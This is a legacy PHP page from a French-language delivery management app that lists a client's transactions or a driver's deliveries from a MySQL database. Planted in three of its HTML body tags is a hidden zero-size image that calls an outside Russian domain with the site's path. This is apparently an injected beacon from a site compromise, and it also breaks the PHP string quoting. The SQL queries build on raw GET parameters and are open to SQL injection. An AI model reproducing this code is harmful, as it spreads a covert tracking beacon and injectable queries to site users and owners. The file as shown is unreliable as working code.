<?php
/* Programme : LstTrsCli.php
* Description : Affichage de la liste des transactions d'un client.
*  			    Permet aussi au livreur de voir ses livraisons
* Auteur : Denis Léveillé 	 		  Date : 2004-01-01
* MAJ : Denis Léveillé 	 		  	  Date : 2007-01-30
* MAJ : Denis Léveillé 	 			  Date : 2007-02-28
*/

include('lib/config.php');
$TabService = get_service("",0);	   

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	include("trsmessen.inc");
						include("./extra/varmessen.inc");
						break;
	case "fr" : 	include("trsmessfr.inc");
						include("./extra/varmessfr.inc");
						break;
	default : 		include("trsmesssp.inc");  
						include("./extra/varmesssp.inc");
} // switch SLangue

 
function MetMessErreur( $Erreur, $Message, $NoErr )
{
	global $TabMessGen, $TabMessTrs;
  include("./extra/varcie.inc");
  echo "
      <html>
      <head>
      <title>$TabMessTrs[20]</title>
      </head>
	  <SCRIPT language=JavaScript1.2 src='./extra/javafich/disablekeys.js'></SCRIPT>
      <body bgcolor='#EEEEFF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
      <h2 align='center' style='margin-top: .7in'>
      $TabMessGen[22] $NoErr - $Erreur</h2>
      <div align='center'>
      <p style='margin-top: .5in'>
      <b>$TabMessGen[23] $Message</b>
      <form action='mainfr.php' method='post'>
         <input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'>
      </form>
      </div>
		<div align='center'><font size=-1>
		$TabMessGen[1]
		<a href='mailto:$AdrCourriel?subject=Page Web $NomCie'>
		$TabMessGen[2]</a>
		</font></div>
		<p align='center' valign='bottom'><font size=1>
		$TabMessGen[8]		 
		$TabMessGen[3]		 
		$NomCie
		$TabMessGen[4]		  
		</p>
		
      <script language='javascript1.2'>
         function QuitterPage() {
              close();
         } // QuitterPage
		 	addKeyEvent();

	  </script>
	  <script language='JavaScript1.2' src='./extra/javafich/blokclick.js'></script>
       </body>
      </html>
  \n";
   exit();
}

// Connection au serveur
$connection = mysql_connect( $host, $user, $password)
  or MetMessErreur(mysql_error(),$TabMessTrs[30], mysql_errno());
$db = mysql_select_db( $database, $connection )
  or MetMessErreur(mysql_error(),$TabMessTrs[31], mysql_errno());

	// Avec $mode on indique à la transaction qui l'appel
$Mod = "Cli";	
if( isset( $_GET['NoCliE'] ) ) 
	$sql = " SELECT * FROM $database.transaction WHERE ENoClient='".@$_GET['NoCliE']."' ";
elseif( isset( $_GET['NoCliD'] ) )
	  $sql = " SELECT * FROM $database.transaction WHERE DNoClient='".@$_GET['NoCliD']."' ";
	else {
	  $sql = " SELECT * FROM $database.transaction WHERE Livreur='".@$_GET['NoCliL']."' AND (Etat='2' OR Etat='3')";
	  $Mod = "Liv";
	}

//MetMessErreur(0,$sql, 0);

$result = mysql_query( $sql, $connection );

if( $result == 0 ) {
  MetMessErreur(mysql_error(),"$TabMessTrs[21]", mysql_errno());
}
elseif (  mysql_num_rows($result) != 0 ) {
  $NbTrs = mysql_num_rows($result);
  $NewEtat = "3";
  echo "<html>
   	   <head>
       <title>$TabMessTrs[42]</title>
 <STYLE TYPE='text/css'>
  td,tr { font-size: 8pt; color: black }
</STYLE>
      </head>
	  <SCRIPT language=JavaScript1.2 src='./extra/javafich/disablekeys.js'></SCRIPT>
     <body bgcolor='#EEEEFF' topmargin='5' leftmargin='0' marginheight='0' marginwidth='0'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
         <form action='".$acces_hermes."transrecherche.php?sid=".session_id()."&do=trouve&mode=$Mod' method='post'>
           <p align='center'> <font size='+2'><b>$TabMessTrs[42]</b></font></p>
             <hr size='5' color='#B406C4'>
             <p align='center'>
             <input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'> ";
			 if( !isset( $_GET['Prov'] ) ) 
              	 echo"<input type='submit' name='Go' value='$TabMessGen[25]'> ";
		   echo "
           <hr size='5' color='#B406C4'>
           <table border='1' align='center'>
             <thead>
                <tr>";
                echo("<th>".mysql_field_name($result,0)."</th>"); // Noappel
                echo("<th width='80'>".mysql_field_name($result,31)."</th>"); // date recu
                echo("<th>".mysql_field_name($result,1)."</th>"); // Service
                echo("<th>".mysql_field_name($result,19)."</th>"); // NoClient
                echo("<th width='100'>Destinataire</th>"); // Destinat
                echo("<th>".mysql_field_name($result,25)."</th>"); // Ville
                echo("<th width='60'>Quantité</th>");
                echo("<th width='60'>Total</th>");
                echo "</tr>
             </thead>
             <tbody>";
 			 	$i = mysql_num_rows($result);
	            echo("<input name='NbTrans' TYPE='hidden' VALUE='$i'>");
	            echo("<input name='NewEtat' TYPE='hidden' VALUE='".@$NewEtat."'>");
                for( $i=0; $i < mysql_num_rows($result); $i++ ) {
				  $row = mysql_fetch_row($result);			
				  $Lign = sprintf("%-10.10s",$row[31]);
                   echo "<tr>";
                   if( strlen($row[0]) )
                           echo("<td>".$row[0]."</td> ");
                   else
                           echo("<td>&nbsp;</td> ");
                   if( strlen($row[31]) ) 
                           echo "<td>".$Lign."</td>";
                   else
                           echo("<td>&nbsp;</td> ");
                   if( strlen($row[1]) )
							echo("<td>".$TabService[$row[1]]."</td> ");
                   else
                           echo("<td>&nbsp;</td> ");
                   echo("<td>".$row[19]."</td> ");
				   if( isset($NoCliD) ) { 
                     if( strlen($row[9]) )
                           echo("<td>".$row[9]." ".$row[10]."</td> ");
                     else
                           echo("<td>&nbsp;</td> ");
                     if( strlen($row[13]) )
                           echo("<td>".$row[13]."</td> ");
                     else
                           echo("<td>&nbsp;</td> ");
				   }
				   else {
                     if( strlen($row[20]) )
                           echo("<td>".$row[20]." ".$row[21]."</td> ");
                     else
                           echo("<td>&nbsp;</td> ");
                     if( strlen($row[25]) )
                           echo("<td>".$row[25]."</td> ");
                     else
                           echo("<td>&nbsp;</td> ");
				   }
                   if( strlen($row[2]) && ($row[2] != 0) )
                           echo("<td>".$row[2]."Lbs</td> ");
                   else
                           echo("<td>".$row[3]."$</td> ");
				   
				   if( isset($NoCliL) )  // $Montant + $CoutLivreur;
				   	   $Total = sprintf("%8.2f$",$row[3] + $row[46]);
				   else // $Montant + $FrTransant + $FrFixe; 
				   	   $Total = sprintf("%8.2f$",$row[3] + $row[39] + $row[40]+ $row[41]);
					   
                   if( strlen($Total) && ($Total != 0) )
                           echo("<td>".$Total."</td> ");
                   else
                           echo("<td>&nbsp;</td> ");
                   echo("<td><input name='choix' TYPE='radio' VALUE='$row[0]'></td>");
			  	   if( $row[5] == "Envoyé" )
                   	   echo("<td><input name='var[$i]' TYPE='checkbox' VALUE='$row[0]'></td>");
				   else
                   	   echo("<td>&nbsp;</td>");
                   echo "</tr>";
                } // for i < nombre de rangé
                echo "</tbody>
           </table>
             <hr size='5' color='#B406C4'>
             <p align='center'>
             $TabMessTrs[23] : $NbTrs<br>
            <hr size='5' color='#B406C4'>
             <p align='center'>
            <input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'> ";
			 if( !isset( $_GET['Prov'] ) ) 
              	 echo"<input type='submit' name='Go' value='$TabMessGen[25]'> ";
			 echo "
        	<input name='transid' TYPE='hidden' VALUE=0>
         </form>
";
}
else {
  echo "
      <html>
      <head>
       <title>$TabMessTrs[42]</title>
      </head>
	  <SCRIPT language=JavaScript1.2 src='./extra/javafich/disablekeys.js'></SCRIPT>
	  <body bgcolor='#EEEEFF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	  <BASE TARGET=MAIN>
      <h2 align='center' style='margin-top: .7in'>
      $TabMessTrs[37]</h2>
      <div align='center'>
      <form action='mainfr.php?do=refresh' method='post'>
         <input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'>
      </form>
      </div>
		<div align='center'><font size=-1>
		$TabMessGen[1]
		<a href='mailto:$AdrCourriel?subject=Page Web $NomCie'>
		$TabMessGen[2]</a>
		</font></div>
		<p align='center' valign='bottom'><font size=1>
		$TabMessGen[8]		 
		$TabMessGen[3]		 
		$NomCie
		$TabMessGen[4]		  
		</p>
  ";
}
?>
		<script language='javascript1.2'>
         function QuitterPage() {
                 close();
         } 
		 	addKeyEvent();

		 </script>
		 <script language='JavaScript1.2' src='./extra/javafich/blokclick.js'></script>
   </body>
</html>

